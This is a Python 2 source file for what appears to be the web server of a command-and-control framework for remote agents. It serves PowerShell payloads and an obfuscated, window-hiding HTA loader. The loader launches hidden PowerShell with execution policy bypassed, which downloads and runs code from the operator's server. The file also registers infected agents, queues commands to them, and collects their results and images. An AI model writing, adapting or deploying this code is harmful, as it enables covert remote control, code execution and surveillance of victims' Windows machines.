from lib import web
from core import config
from core import rsa
from core.color import bcolors
import time
import base64
import sys
reload(sys)
sys.setdefaultencoding('utf-8')
# _____ ___________ ___________  ________   __  _____  _       ___ ______ _____  ___ _____ ___________ 
#/  __ \  _  |  _  \  ___|  _  \ | ___ \ \ / / |  __ \| |     / _ \|  _  \_   _|/ _ \_   _|  _  | ___ \
#| /  \/ | | | | | | |__ | | | | | |_/ /\ V /  | |  \/| |    / /_\ \ | | | | | / /_\ \| | | | | | |_/ /
#| |   | | | | | | |  __|| | | | | ___ \ \ /   | | __ | |    |  _  | | | | | | |  _  || | | | | |    / 
#| \__/\ \_/ / |/ /| |___| |/ /  | |_/ / | |   | |_\ \| |____| | | | |/ / _| |_| | | || | \ \_/ / |\ \ 
# \____/\___/|___/ \____/|___/   \____/  \_/    \____/\_____/\_| |_/___/  \___/\_| |_/\_/  \___/\_| \_|
#                                                                                                      
# 
class MyApplication(web.application):
    def run(self, port=8080, host='0.0.0.0', *middleware):
        func = self.wsgifunc(*middleware)
        return web.httpserver.runsimple(func, (host, port))

urls = (
    '/', 'index',
    '/get', 'payload',
    '/getc','payloadc',
    '/hta', 'mshta',
    '/info/(.*)', 'info',
    '/dl/(.*)', 'download',
    '/up/(.*)', 'upload',
    '/img/(.*)', 'image',
    '/cm/(.*)','command',
     '/re/(.*)','result'
)
def toB52(st):
  value = 0;
  encoded = []
  while len(st) % 2 > 0:
    st = st + chr(0)
  for i in range(len(st)):
    value = value * 256 + ord(st[i])
    if (i+1) % 2 == 0:
      for j in range(3):
        encoded.append(chr(40 + value % 52))
        value //= 52
  encoded.reverse()
  return ''.join(encoded);
  
class index:
    def GET(self):
        return "Hello.!!!!"
        
class payload:
	def GET(self):
		ip = web.ctx.ip
    		p_out = '[+] Powershell PAYLOAD Send (%s)'%(ip)
    		print bcolors.OKGREEN + p_out + bcolors.ENDC
		return config.PAYLOAD()
class payloadc:
	def GET(self):
		ip = web.ctx.ip
    		p_out = '[+] Powershell Encoded PAYLOAD Send (%s)'%(ip)
    		print bcolors.OKGREEN + p_out + bcolors.ENDC
    		payload = config.PAYLOAD()
		return toB52(payload)
class info:
    def POST(self,id):
    	data = web.data()
    	if(config.AGENTS.get(id) == None and data != None):
    		data = rsa.decrypt(config.public_key,data).split('**')
    		ip = web.ctx.ip
    		data.insert(0,ip)
    		data.insert(0,config.COUNT)
    		config.set_count(config.COUNT+1)
    		p_out = '[+] New Agent Connected(%d): %s - %s\\%s'%(config.COUNT-1,ip,data[6],data[7])
    		print bcolors.OKGREEN + p_out + bcolors.ENDC
    		config.AGENTS.update({id:data})
    		config.COMMAND.update({id:[]})
		config.TIME.update({id:time.time()})
    	
        return "OK"	
class download:
    def GET(self,name):
    	try:
    		name = name.decode("base64").replace('\n','')
    		fp = open('file/'+name,'rb')
		file = fp.read()
		file = file.encode("base64").replace('\n','')
    		p_out = '[+] download file %s'%(name)
        	print bcolors.OKGREEN + p_out + bcolors.ENDC
        	return file
    	except Exception as e:
		print '[-] Download: '+str(e)
		return ""

class mshta:
    def GET(self):
    	ip = web.ctx.ip
    	p_out = '[+] New Agent Request PAYLOAD (%s)'%(ip)
    	print bcolors.OKGREEN + p_out + bcolors.ENDC
    	code = '''
<html>
<head>
<script language="JScript">
window.resizeTo(1, 1);
window.moveTo(-2000, -2000);
window.blur();

try
{
    window.onfocus = function() { window.blur(); }
    window.onerror = function(sMsg, sUrl, sLine) { return false; }
}
catch (e){}

function replaceAll(find, replace, str) 
{
  while( str.indexOf(find) > -1)
  {
    str = str.replace(find, replace);
  }
  return str;
}
function bas( string )
    {
        string = replaceAll(']','=',string);
        string = replaceAll('[','a',string);
        string = replaceAll(',','b',string);
        string = replaceAll('@','D',string);
        string = replaceAll('-','x',string);
        string = replaceAll('~','N',string);
        string = replaceAll('*','E',string);
        string = replaceAll('%','C',string);
        string = replaceAll('$','H',string);
        string = replaceAll('!','G',string);
        string = replaceAll('{','K',string);
        string = replaceAll('}','O',string);
        var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        var result     = '';

        var i = 0;
        do {
            var b1 = characters.indexOf( string.charAt(i++) );
            var b2 = characters.indexOf( string.charAt(i++) );
            var b3 = characters.indexOf( string.charAt(i++) );
            var b4 = characters.indexOf( string.charAt(i++) );

            var a = ( ( b1 & 0x3F ) << 2 ) | ( ( b2 >> 4 ) & 0x3 );
            var b = ( ( b2 & 0xF  ) << 4 ) | ( ( b3 >> 2 ) & 0xF );
            var c = ( ( b3 & 0x3  ) << 6 ) | ( b4 & 0x3F );

            result += String.fromCharCode(a) + (b?String.fromCharCode(b):'') + (c?String.fromCharCode(c):'');

        } while( i < string.length );

        return result;
    }

var es = '{code}';
eval(bas(es));
</script>
<hta:application caption="no" showInTaskBar="no" windowState="minimize" navigable="no" scroll="no" />
</head>
<body>
</body>
</html> 	

'''
	js = '''
	
var cm="powershell -exec bypass -w 1 -c $V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX($V.downloadstring('http://{ip}:{port}/get'));";
var w32ps= GetObject('winmgmts:').Get('Win32_ProcessStartup');
w32ps.SpawnInstance_();
w32ps.ShowWindow=0;
var rtrnCode=GetObject('winmgmts:').Get('Win32_Process').Create(cm,'c:\\\\',w32ps,null);
'''
	js = js.replace('{ip}',config.IP).replace('{port}',config.PORT)
	js = js.encode('base64').replace('\n','')
	re = [[']','='],['[','a'],[',','b'],['@','D'],['-','x'],['~','N'],['*','E'],['%','C'],['$','H'],['!','G'],['{','K'],['}','O']]
	for i in re:
		js = js.replace(i[1],i[0])
        return code.replace('{code}',js)	
        
class upload:
    def GET(self):
        return "Hello.!!!!"	
        
class image:
    def POST(self,id):
    	data = web.data()
        if(config.AGENTS.get(id) != None and data != None):
        	data = data.decode("base64")
        	fp = open('images/%s.jpg'%(id),'wb')
        	fp.write(data)
        	fp.close()
        	p_out = '[+] Agent (%d) - %s send image(%s bytes)'%(config.AGENTS[id][0],config.AGENTS[id][7],len(data))
        	print bcolors.OKGREEN + p_out + bcolors.ENDC
        return 'OK'

class command:
    def GET(self,id):
	if(config.AGENTS.get(id) != None):
		config.TIME[id] = time.time()

    	if(config.AGENTS.get(id) != None and len(config.COMMAND.get(id))>0):
    		return rsa.encrypt(config.prv_key,config.COMMAND[id].pop(0))
	elif(config.AGENTS.get(id) == None):
    		return "REGISTER"
	else:
		return ""
class result:
    def POST(self,id):
        data = web.data()
        if(config.AGENTS.get(id) != None and data != None):
        	data = data.decode('base64')
        	p_out = '[+] Agent (%d) - %s send Result'%(config.AGENTS[id][0],config.AGENTS[id][7])
        	print bcolors.OKGREEN + p_out + bcolors.ENDC
        	print data
		
def main():
	try:
		web.config.log_toprint = False
		app = MyApplication(urls, globals())
		app.run(port=int(config.PORT))
	except Exception as e:
		print '[-] ERROR(webserver->main): %s'%(str(e))
